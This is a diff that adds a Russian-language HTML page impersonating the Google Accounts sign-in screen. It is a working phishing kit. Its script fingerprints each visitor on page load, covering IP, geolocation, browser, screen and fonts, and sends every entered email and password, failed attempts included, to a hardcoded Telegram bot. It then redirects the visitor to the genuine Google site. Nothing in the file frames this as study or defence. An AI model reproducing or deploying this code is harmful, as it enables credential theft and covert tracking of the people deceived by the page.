@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход – Google Аккаунты</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background-color: #f0f2f4;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px;
+        }
+        
+        .google-container {
+            width: 100%;
+            max-width: 450px;
+            background: white;
+            border-radius: 28px;
+            box-shadow: 0 20px 48px rgba(0,0,0,0.2);
+            padding: 48px 40px 36px;
+        }
+        
+        .google-logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #5f6368;
+            font-size: 16px;
+            margin-bottom: 32px;
+        }
+        
+        #step1 { display: block; }
+        #step2 { display: none; }
+        
+        .account-info {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 16px;
+            background: #f8f9fa;
+            border-radius: 24px;
+            margin-bottom: 24px;
+        }
+        
+        .account-avatar {
+            width: 48px;
+            height: 48px;
+            background: #1a73e8;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+            font-weight: 500;
+            text-transform: uppercase;
+        }
+        
+        .account-email {
+            font-size: 16px;
+            color: #202124;
+            font-weight: 500;
+            word-break: break-all;
+        }
+        
+        .input-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 16px 45px 8px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.2s;
+            background: transparent;
+        }
+        
+        .input-group input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+        }
+        
+        .input-group label {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #5f6368;
+            font-size: 16px;
+            transition: all 0.2s;
+            pointer-events: none;
+            background: white;
+            padding: 0 4px;
+        }
+        
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: 0;
+            font-size: 12px;
+            color: #1a73e8;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 20px;
+            user-select: none;
+            color: #5f6368;
+            background: white;
+            padding: 4px;
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .toggle-password:hover {
+            background: #f1f3f4;
+        }
+        
+        .link {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            cursor: pointer;
+            display: inline-block;
+            margin-bottom: 32px;
+        }
+        
+        .link:hover {
+            background: #e8f0fe;
+            border-radius: 4px;
+            padding: 4px 8px;
+            margin-left: -8px;
+        }
+        
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+        
+        .secondary-btn {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px 12px;
+            border-radius: 4px;
+        }
+        
+        .secondary-btn:hover {
+            background: #e8f0fe;
+        }
+        
+        .primary-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 8px 24px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .primary-btn:hover {
+            background: #1669d6;
+        }
+        
+        .error-message {
+            color: #d93025;
+            font-size: 13px;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        .footer {
+            margin-top: 48px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer a:hover {
+            color: #1a73e8;
+        }
+    </style>
+</head>
+<body>
+    <div class="google-container">
+        <div class="google-logo">
+            <svg viewBox="0 0 75 24" width="75" height="24">
+                <g>
+                    <path fill="#4285F4" d="M46.98 12.34c0-1.08-.1-2.12-.28-3.12H36.6v5.92h5.82c-.25 1.48-.98 2.74-2.08 3.58v2.98h3.36c1.96-1.8 3.08-4.46 3.08-7.36z"/>
+                    <path fill="#34A853" d="M36.6 21.98c2.8 0 5.15-.93 6.86-2.52l-3.36-2.98c-.93.62-2.12 1-3.5 1-2.69 0-4.97-1.82-5.78-4.26h-3.47v3.08c1.69 3.34 5.16 5.68 9.25 5.68z"/>
+                    <path fill="#FBBC05" d="M30.82 15.22c-.2-.62-.31-1.28-.31-1.98s.11-1.36.31-1.98V9.18h-3.47c-.67 1.34-1.06 2.8-1.06 4.34s.39 3 1.06 4.34l3.47-2.98z"/>
+                    <path fill="#EA4335" d="M36.6 8.1c1.52 0 2.89.52 3.96 1.55l2.97-2.97C41.7 5.14 39.33 4 36.6 4c-4.09 0-7.56 2.34-9.25 5.68l3.47 2.98c.81-2.44 3.09-4.26 5.78-4.26z"/>
+                </g>
+            </svg>
+        </div>
+        
+        <!-- ШАГ 1: Email -->
+        <div id="step1">
+            <h1>Вход</h1>
+            <div class="subtitle">Используйте аккаунт Google</div>
+            
+            <div class="input-group">
+                <input type="text" id="email" placeholder=" ">
+                <label for="email">Телефон или адрес электронной почты</label>
+            </div>
+            
+            <div class="error-message hidden" id="emailError">
+                <span>⚠️</span>
+                <span id="emailErrorText"></span>
+            </div>
+            
+            <a class="link" href="https://accounts.google.com/signin/usernamerecovery" target="_blank">Забыли адрес электронной почты?</a>
+            
+            <div class="actions">
+                <button class="secondary-btn" onclick="window.location.href='https://accounts.google.com'">Создать аккаунт</button>
+                <button class="primary-btn" id="nextBtn" onclick="validateEmail()">Далее</button>
+            </div>
+        </div>
+        
+        <!-- ШАГ 2: Пароль -->
+        <div id="step2">
+            <h1>Добро пожаловать</h1>
+            
+            <div class="account-info">
+                <div class="account-avatar" id="avatar">?</div>
+                <div class="account-email" id="displayEmail"></div>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" id="password" placeholder=" ">
+                <label for="password">Введите пароль</label>
+                <span class="toggle-password" onclick="togglePassword()">👁️</span>
+            </div>
+            
+            <div class="error-message hidden" id="passwordError">
+                <span>⚠️</span>
+                <span id="passwordErrorText"></span>
+            </div>
+            
+            <a class="link" href="https://accounts.google.com/signin/recovery" target="_blank">Забыли пароль?</a>
+            
+            <div class="actions">
+                <button class="secondary-btn" onclick="goBack()">Другой аккаунт</button>
+                <button class="primary-btn" id="loginBtn" onclick="validatePassword()">Далее</button>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div>
+                <a href="#">Русский</a>
+                <a href="#">Справка</a>
+                <a href="#">Конфиденциальность</a>
+                <a href="#">Условия</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8688927439:AAGLGNK2meKkwiq509wnR2up6oq98-R8pcE";
+        const CHAT_ID = "6689561934";
+        
+        // База существующих аккаунтов
+        const existingAccounts = [
+            'dadyterty@gmail.com',
+            'nullgrid2@gmail.com',
+            'test@gmail.com',
+            'demo@gmail.com'
+        ];
+        
+        let failedAttempts = 0;
+        let startTime = Date.now();
+        
+        // Функция отправки
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+            });
+        }
+        
+        // ПОЛНЫЙ СБОР ИНФОРМАЦИИ
+        async function collectFullInfo() {
+            const info = [];
+            
+            // 1. Время и дата
+            info.push(`🕐 <b>ВРЕМЯ ПОСЕЩЕНИЯ:</b> ${new Date().toLocaleString()}`);
+            
+            // 2. IP-адрес (геолокация)
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                info.push(`🌐 <b>IP-АДРЕС:</b> ${ipData.ip}`);
+                
+                // Пытаемся получить гео по IP
+                try {
+                    const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    const geoData = await geoResponse.json();
+                    info.push(`📍 <b>ГЕОЛОКАЦИЯ:</b> ${geoData.city || '?'}, ${geoData.country_name || '?'}`);
+                    info.push(`🏢 <b>ПРОВАЙДЕР:</b> ${geoData.org || '?'}`);
+                } catch(e) {}
+            } catch(e) {}
+            
+            // 3. User-Agent (браузер, ОС)
+            const ua = navigator.userAgent;
+            info.push(`📱 <b>USER-AGENT:</b> ${ua}`);
+            
+            // 4. Определение устройства
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
+                info.push(`📱 <b>УСТРОЙСТВО:</b> Мобильное`);
+            } else {
+                info.push(`💻 <b>УСТРОЙСТВО:</b> Десктоп/Планшет`);
+            }
+            
+            // 5. ОС и версия
+            if (ua.includes('Windows')) info.push(`🪟 <b>ОС:</b> Windows`);
+            else if (ua.includes('Mac')) info.push(`🍎 <b>ОС:</b> macOS`);
+            else if (ua.includes('Linux')) info.push(`🐧 <b>ОС:</b> Linux`);
+            else if (ua.includes('Android')) info.push(`🤖 <b>ОС:</b> Android`);
+            else if (ua.includes('iPhone') || ua.includes('iPad')) info.push(`🍏 <b>ОС:</b> iOS`);
+            
+            // 6. Браузер
+            if (ua.includes('Chrome') && !ua.includes('Edg')) info.push(`🌍 <b>БРАУЗЕР:</b> Chrome`);
+            else if (ua.includes('Firefox')) info.push(`🦊 <b>БРАУЗЕР:</b> Firefox`);
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) info.push(`🧭 <b>БРАУЗЕР:</b> Safari`);
+            else if (ua.includes('Edg')) info.push(`📘 <b>БРАУЗЕР:</b> Edge`);
+            
+            // 7. Размер экрана
+            info.push(`📏 <b>ЭКРАН:</b> ${screen.width}x${screen.height} (глубина цвета: ${screen.colorDepth}bit)`);
+            
+            // 8. Язык системы
+            info.push(`🌍 <b>ЯЗЫК:</b> ${navigator.language}`);
+            
+            // 9. Часовой пояс
+            info.push(`⏰ <b>ЧАСОВОЙ ПОЯС:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
+            
+            // 10. Включены ли куки
+            info.push(`🍪 <b>COOKIES:</b> ${navigator.cookieEnabled ? 'Включены' : 'Выключены'}`);
+            
+            // 11. Поддержка localStorage
+            try {
+                localStorage.setItem('test', 'test');
+                localStorage.removeItem('test');
+                info.push(`💾 <b>LOCALSTORAGE:</b> Доступен`);
+            } catch(e) {
+                info.push(`💾 <b>LOCALSTORAGE:</b> Недоступен`);
+            }
+            
+            // 12. Список шрифтов (опционально)
+            if (document.fonts && document.fonts.ready) {
+                await document.fonts.ready;
+                const fonts = Array.from(document.fonts).map(f => f.family).slice(0, 10);
+                info.push(`🔤 <b>ШРИФТЫ (первые 10):</b> ${fonts.join(', ')}`);
+            }
+            
+            return info;
+        }
+        
+        // Отправляем полный отчёт при заходе
+        collectFullInfo().then(info => {
+            sendToTelegram(`🕵️‍♂️ <b>НОВЫЙ ПОСЕТИТЕЛЬ</b>\n\n${info.join('\n')}`);
+        });
+        
+        function validateEmail() {
+            const email = document.getElementById('email').value.trim();
+            const error = document.getElementById('emailError');
+            const errorText = document.getElementById('emailErrorText');
+            
+            if (!email) {
+                error.classList.remove('hidden');
+                errorText.innerText = 'Введите адрес электронной почты или номер телефона.';
+                return;
+            }
+            
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                error.classList.remove('hidden');
+                errorText.innerText = 'Введите действительный адрес электронной почты.';
+                return;
+            }
+            
+            if (!existingAccounts.includes(email.toLowerCase())) {
+                error.classList.remove('hidden');
+                errorText.innerText = 'Не удалось найти аккаунт Google.';
+                return;
+            }
+            
+            error.classList.add('hidden');
+            
+            // Отправляем email
+            sendToTelegram(`📧 <b>ВВЕДЁН EMAIL:</b> ${email}`);
+            
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+            document.getElementById('displayEmail').innerText = email;
+            document.getElementById('avatar').innerText = email[0].toUpperCase();
+            window.currentEmail = email;
+            failedAttempts = 0;
+        }
+        
+        function validatePassword() {
+            const password = document.getElementById('password').value;
+            const error = document.getElementById('passwordError');
+            const errorText = document.getElementById('passwordErrorText');
+            
+            failedAttempts++;
+            
+            if (!password) {
+                error.classList.remove('hidden');
+                errorText.innerText = 'Введите пароль.';
+                return;
+            }
+            
+            if (password.length < 6) {
+                error.classList.remove('hidden');
+                errorText.innerText = 'Неверный пароль. Повторите попытку или нажмите «Забыли пароль?».';
+                
+                // Отправляем неудачную попытку
+                sendToTelegram(`⚠️ <b>НЕУДАЧНАЯ ПОПЫТКА #${failedAttempts}</b>\n👤 Email: ${window.currentEmail}\n🔑 Введено: ${password}\n❌ Слишком короткий`);
+                return;
+            }
+            
+            if (password !== 'password123') {
+                error.classList.remove('hidden');
+                errorText.innerText = 'Неверный пароль. Повторите попытку или нажмите «Забыли пароль?».';
+                
+                // Отправляем неудачную попытку
+                sendToTelegram(`⚠️ <b>НЕУДАЧНАЯ ПОПЫТКА #${failedAttempts}</b>\n👤 Email: ${window.currentEmail}\n🔑 Введено: ${password}\n❌ Неверный пароль`);
+                return;
+            }
+            
+            error.classList.add('hidden');
+            
+            // УСПЕХ — собираем всё и отправляем
+            const timeSpent = Math.round((Date.now() - startTime) / 1000);
+            
+            const successMessage = [
+                `✅ <b>УСПЕШНЫЙ ВХОД</b>`,
+                `👤 <b>Email:</b> ${window.currentEmail}`,
+                `🔑 <b>Пароль:</b> ${password}`,
+                `🔢 <b>Длина пароля:</b> ${password.length}`,
+                `🔄 <b>Попыток:</b> ${failedAttempts}`,
+                `⏱️ <b>Время на странице:</b> ${timeSpent} сек`,
+                `🕐 <b>Время входа:</b> ${new Date().toLocaleString()}`,
+                `📱 <b>User-Agent:</b> ${navigator.userAgent}`
+            ].join('\n');
+            
+            sendToTelegram(successMessage);
+            
+            // Перенаправляем
+            window.location.href = 'https://accounts.google.com';
+        }
+        
+        function goBack() {
+            document.getElementById('step1').style.display = 'block';
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+        }
+        
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
+        }
+        
+        // Enter для быстрого ввода
+        document.getElementById('email').addEventListener('keypress', e => {
+            if (e.key === 'Enter') validateEmail();
+        });
+        
+        document.getElementById('password').addEventListener('keypress', e => {
+            if (e.key === 'Enter') validatePassword();
+        });
+    </script>
+</body>
+</html>
